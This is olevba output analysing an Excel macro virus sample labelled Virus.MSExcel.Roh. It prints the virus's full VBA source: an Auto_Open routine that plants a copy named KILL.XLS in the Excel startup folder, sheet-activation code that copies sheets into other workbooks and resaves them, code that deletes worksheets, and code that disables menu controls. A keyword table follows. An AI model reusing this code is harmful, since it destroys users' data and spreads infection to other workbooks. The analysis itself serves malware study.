olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Roh-f266db8f731251bf31dcc67536def96ecaa06c51
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Roh-f266db8f731251bf31dcc67536def96ecaa06c51 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Roh-f266db8f731251bf31dcc67536def96ecaa06c51 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Roh-f266db8f731251bf31dcc67536def96ecaa06c51 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function D_Sheet()
On Error Resume Next
ThisWorkbook.Save
Application.DisplayAlerts = False
For I = 1 To ThisWorkbook.Sheets.Count
  Nam = ThisWorkbook.Sheets.Count
  If ThisWorkbook.Sheets(I).Visible >= 0 Then ThisWorkbook.Sheets(I).Visible = -1
Next I
For I = ThisWorkbook.Sheets.Count To 1 Step -1
  If ThisWorkbook.Sheets(I).Name <> "." Then ThisWorkbook.Sheets(I).Delete
Next I
End Function
Public Function D_File()
On Error Resume Next
If ActiveWorkbook.Path <> "" Then D_F = ActiveWorkbook.Path & "*.XLS"
D_F = Application.DefaultFilePath & "*.XLS"
File = Dir(D_F, vbHidden)
Do While File <> ""
  If File <> "." And File <> ".." Then 'Kill ActiveWorkbook.Path & "\" & File
  File = Dir
Loop
End Function
Public Function T_Menu()
On Error Resume Next
For Each Bar In CommandBars
  If UCase(Bar.Name) = "WORKSHEET MENU BAR" Then
    I = 0
    For Each Ctl In CommandBars("Window").Controls
      I = I + 1
      If Ctl.ID = 866 Then CommandBars("Window").Controls(I).Enabled = False
    Next
   
    I = 0
    For Each Ctl In CommandBars("Tools").Controls
      I = I + 1
      If Ctl.ID = 30017 Then CommandBars("Tools").Controls(I).Enabled = False
    Next
  End If

  I = 0
  For Each Ctl In CommandBars(Bar.Name).Controls
    I = I + 1
    If Ctl.ID = 30017 Or Ctl.ID = 866 Then CommandBars(Bar.Name).Controls(I).Enabled = False
  Next
Next
End Function
Public Function M_Click()
On Error Resume Next
Dim SF_Name() As String
If Trim(ActiveWorkbook.Path) = "" Then Exit Function
F_Name = ActiveWorkbook.Path & "\" & ActiveWorkbook.Name
OK = "F"
No = Worksheets.Count
Application.ScreenUpdating = False
For I = 1 To No
  If OK = "F" And Worksheets(I).Name = "." Then OK = "T"
  If Sheets(Worksheets(I).Name).Visible >= 0 Then
     Kx = Kx + 1
     ReDim Preserve SF_Name(Kx)
     SF_Name(Kx) = Worksheets(I).Name
     Sheets(Worksheets(I).Name).Visible = -1
  End If
Next I

If OK = "T" Then Sheets(".").Visible = 2: Exit Function
D_Sheet
A_SHEET = ActiveWorkbook.Name
N_Sheet = ThisWorkbook.Name
Windows(N_Sheet).Visible = -1
Application.ScreenUpdating = False
For I = No To 1 Step -1
  Tx = Workbooks(A_SHEET).Worksheets(I).Name
  Workbooks(A_SHEET).Sheets(Tx).Move Before:=Workbooks(N_Sheet).Sheets(1)
Next I
Sheets(".").Visible = 2
For I = 1 To Kx
   Sheets(SF_Name(I)).Visible = False
Next I

Application.DisplayAlerts = False
ActiveWorkbook.SaveAs Filename:=F_Name
Application.DisplayAlerts = True
End Function
Public Function Auto_Open()
'On Error GoTo Er
If Dir(Application.StartupPath & "\FT.XLS") = "" Then
   D_Sheet
   Application.StatusBar = ""
   ThisWorkbook.SaveAs Filename:=Application.StartupPath & "\KILL.XLS"
   Application.DisplayAlerts = True
End If
If UCase(ThisWorkbook.Name) <> "KILL.XLS" Then
   Windows(ThisWorkbook.Name).Visible = True
Else
Er:
   Windows(ThisWorkbook.Name).Visible = False
End If
Application.OnSheetActivate = "M_Click"
'D_File
T_Menu
End Function



-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1 (2
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |M_Click             |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

